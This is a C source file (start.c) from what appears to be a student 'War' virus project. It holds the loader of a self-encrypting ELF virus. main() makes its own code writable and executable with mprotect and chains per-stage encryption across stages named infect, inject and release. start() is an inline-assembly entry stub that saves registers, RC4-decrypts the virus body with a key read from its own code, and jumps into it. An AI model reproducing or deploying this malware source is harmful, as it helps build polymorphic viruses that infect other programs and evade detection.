/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*  start.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/04 13:48:47 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

int		main(void)
{
	t_data	data = {0};

	void	*sstart = start;
	size_t	align = (unsigned long)sstart % 0x1000;
	if (mprotect(sstart - align, ((void*)end_of_data - (void*)start) + 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
	{
		perror("mprotect");
		return (-1);
	}

	// end
	/* update_two(&data.key, (char*)release, (size_t)end - (size_t)release); */
	/* revert_two(&data.key, (char*)end, (size_t)update_one - (size_t)end); */
	/* printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "end", end, (size_t)update_one - (size_t)end, data.key.two); */


	// release
	update_one(&data.key, (char*)inject, (size_t)release - (size_t)inject);
	revert_one(&data.key, (char*)release, (size_t)end - (size_t)release);
	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "release", release, (size_t)end - (size_t)release, data.key.one);


	// inject
	update_two(&data.key, (char*)infect, (size_t)inject - (size_t)infect);
	revert_two(&data.key, (char*)inject, (size_t)release - (size_t)inject);
	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "inject", infect, (size_t)release - (size_t)inject, data.key.two);


	// infect
	update_one(&data.key, (char*)inspect, (size_t)infect - (size_t)inspect);
	revert_one(&data.key, (char*)infect, (size_t)inject - (size_t)infect);
	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "infect", infect, (size_t)inject - (size_t)infect, data.key.one);


	// inspect
	update_two(&data.key, (char*)locate, (size_t)inspect - (size_t)locate);
	revert_two(&data.key, (char*)inspect, (size_t)infect - (size_t)inspect);
	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "inspect", inspect, (size_t)infect - (size_t)inspect, data.key.two);


	// locate
	update_one(&data.key, (char*)war, (size_t)locate - (size_t)war);
	revert_one(&data.key, (char*)locate, (size_t)inspect - (size_t)locate);
	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "locate", locate, (size_t)inspect - (size_t)locate, data.key.one);


	// war
	update_two(&data.key, (char*)opening, (size_t)war - (size_t)opening);
	revert_two(&data.key, (char*)war, (size_t)locate - (size_t)war);
	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "war", war, (size_t)locate - (size_t)war, data.key.two);


	// opening
	update_one(&data.key, (char*)start, (size_t)opening - (size_t)start);
	revert_one(&data.key, (char*)opening, (size_t)war - (size_t)opening);
	printf("%-10s: addr: [%p] size: %ld\tkey: 0x%lx\n", "opening", opening, (size_t)war - (size_t)opening, data.key.one);


	// revert like start() will do
	update_one(&data.key, (char*)start, (size_t)opening - (size_t)start);
	revert_one(&data.key, (char*)opening, (size_t)war - (size_t)opening);


	data.context = true;
	opening(&data);
}

void	start(void)
{
	__asm__ __volatile__ (
		"push	rbp;"
		"push	0x0;"
		"push	rbx;"
		"push	rax;"
		"push	rdi;"
		"push	rsi;"
		"push	rdx;"
		"push	rcx;"
		"push	r8;"
		"push	r9;"
		"push	r10;"
		"push	r11;"
		"push	r12;"
		"push	r13;"
		"push	r14;"
		"push	r15;"
		);

	t_data	data = {0};
	__asm__ __volatile__ (
		"mov	%0, rsp;"
		: "=r"(data.rsp)
		);

	uint8_t *ptr = (uint8_t*)_rc4;
	for (register int i = 0  ; i < KEY_SIZE ; i++)
		data.cpr_key[i] = ptr[i];
	_rc4((uint8_t*)data.cpr_key, KEY_SIZE, (uint8_t*)opening, ((size_t)_rc4 - (size_t)opening));

#ifdef DEBUG
	char de[] = "start\t \n";
	data.context == true ?	de[7] = 49 : 48;
	_write(1, de, _strlen(de));
#endif

	data.context = true;
	update_one(&data.key, (char*)start, (size_t)opening - (size_t)start);
	revert_one(&data.key, (char*)opening, (size_t)war - (size_t)opening);
	opening(&data);
}
